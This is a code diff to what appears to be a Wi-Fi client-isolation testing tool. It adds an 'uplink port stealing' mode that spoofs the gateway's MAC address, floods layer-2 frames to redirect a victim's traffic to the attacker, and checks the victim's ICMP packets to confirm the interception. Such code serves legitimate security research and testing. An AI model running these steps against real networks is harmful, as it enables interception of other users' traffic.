@@ -775,6 +775,10 @@ class Client2Client:
 		if ICMP in eth and eth[ICMP].type == 0 and eth[Raw].load == b"1234567890" :
 			log(STATUS, f">>> Downlink port stealing is successful.", color="red")
 
+	def monitor_eth_port_steal_uplink(self, eth):
+		if ICMP in eth and eth[ICMP].type == 0 and eth[Raw].load == b"abcdefghijklmn" :
+			log(STATUS, f">>> Uplink port stealing is successful.", color="red")
+
 	def send_c2c_frame(self):
 		# Option one: test forwarding at the IP level. send_eth will add Ethernet header.
 		if self.options.c2c_ip is not None:
@@ -803,6 +807,17 @@ class Client2Client:
 				time.sleep(0.1)
 			log(STATUS, f"Finished sending 1000 frames.")
 
+		# Option four: test port stealing (uplink) by letting the attacker send a lot of layer-2 frames with src addr as the victim's gateway. 
+		elif self.options.c2c_port_steal_uplink is not None:
+			# Before calling this function, self.sup_attacker.mac is already modified to victim's gateway MAC addr. 
+			p = Ether(src=self.sup_attacker.mac, dst=self.sup_attacker.mac, type=0x0800)/Raw(b"port_steal")
+			log(STATUS, f"Sending port stealing frames from attacker (gateway MAC address) to himself:       {repr(p)} (Ethernet destination is the gateway/router)")
+			for _ in range(1000):
+				self.sup_attacker.send_eth(p)
+				time.sleep(0.1)
+			log(STATUS, f"Finished sending 1000 uplink stealing frames.")
+
+
 		else:
 			# Note: there are different forms of ARP poisoning. We only test for the basic variant,
 			# which is the one most likely to be used/detected. Although scapy can automatically fill
@@ -821,6 +836,15 @@ class Client2Client:
 			for _ in range(500):
 				self.sup_victim.send_eth(p)
 				time.sleep(0.5)
+
+	def send_uplink_frame2(self):
+		if self.options.c2c_port_steal_uplink is not None:
+			ip = IP(src=self.sup_victim.clientip, dst="8.8.8.8")/ICMP(id=random.randint(0, 0xFFFF), seq=random.randint(0, 0xFFFF))
+			p = Ether(src=self.sup_victim.mac, dst=self.sup_victim.routermac)/ip/Raw(b"abcdefghijklmn")
+			log(STATUS, f"Sending ICMP echo packet from victim to 8.8.8.8:       {repr(p)}")
+			for _ in range(500):
+				self.sup_victim.send_eth(p)
+				time.sleep(0.5)
 			
 
 
@@ -832,6 +856,11 @@ class Client2Client:
 	def start_attacker_receiver(self):
 		self.sup_attacker.set_eth_handler(self.monitor_eth_port_steal)
 		self.sup_attacker.event_loop(timeout=5)
+
+	def start_attacker_receiver2(self):
+		self.sup_attacker.set_eth_handler(self.monitor_eth_port_steal_uplink)
+		self.sup_attacker.event_loop(timeout=5)
+		self.sup_victim.event_loop(timeout=5)
 
 	def run(self):
 		# Start both clients
@@ -853,6 +882,9 @@ class Client2Client:
 		# Let the victim get an IP address
 		self.sup_victim.get_ip_address()
 
+		if self.options.c2c_port_steal_uplink is not None:
+			set_macaddress(self.options.c2c, self.sup_victim.routermac)
+
 		# If --other-bss is connect, connect to a different BSSID. Otherwise connect to the same BSSID.
 		if self.options.other_bss:
 			log(STATUS, f"Will now connect to a BSSID different than {self.bssid_victim}")
@@ -869,7 +901,8 @@ class Client2Client:
 			self.sup_attacker.connect(self.sup_attacker.netid_attacker, timeout=60)
 
 		# Let the attacker get an IP address, also
-		self.sup_attacker.get_ip_address()
+		if self.options.c2c_port_steal_uplink is None and self.options.c2c_port_steal is None:
+			self.sup_attacker.get_ip_address()
 
 		# [ Send a packet from the attacker to the victim ]
 
@@ -877,11 +910,16 @@ class Client2Client:
 		
 		if self.options.c2c_port_steal is not None:
 			thread2 = threading.Thread(target=self.start_attacker_receiver)
+		elif self.options.c2c_port_steal_uplink is not None:
+			thread2 = threading.Thread(target=self.start_attacker_receiver2)
 		else:
 			thread2 = threading.Thread(target=self.start_monitor)
 
 		if self.options.c2c_port_steal is not None:
 			thread3 = threading.Thread(target=self.send_uplink_frame)
+			thread3.start()
+		elif self.options.c2c_port_steal_uplink is not None:
+			thread3 = threading.Thread(target=self.send_uplink_frame2)
 			thread3.start()
 
 		thread2.start()
@@ -891,7 +929,7 @@ class Client2Client:
 
 		thread1.join()
 		thread2.join()
-		if self.options.c2c_port_steal is not None:
+		if self.options.c2c_port_steal is not None or self.options.c2c_port_steal_uplink is not None:
 			thread3.join()
 
 
@@ -1008,6 +1046,7 @@ def main():
 	parser.add_argument("--c2m-mon-channel", type=int, help="The monitored channel for that c2m's second interface")
 	parser.add_argument("--c2m-mon-output", help="c2m's second interface's monitoring output filename")
 	parser.add_argument("--c2c-port-steal", help="Second interface to test port stealing.")
+	parser.add_argument("--c2c-port-steal-uplink", help="Second interface to test port stealing (uplink).")
 	parser.add_argument("--fast", help="Fast override attack using second given interface.")
 	parser.add_argument("--check-gtk-shared", help="Checking if second given interface receives the same GTK from BSSID.")
 	options = parser.parse_args()
@@ -1029,6 +1068,7 @@ def main():
 	if options.c2c_ip is not None: options.c2c = options.c2c_ip
 	if options.check_gtk_shared is not None: options.c2c = options.check_gtk_shared
 	if options.c2c_port_steal is not None: options.c2c = options.c2c_port_steal
+	if options.c2c_port_steal_uplink is not None: options.c2c = options.c2c_port_steal_uplink
 
 	options.port = 443
 	if ":" in options.server:
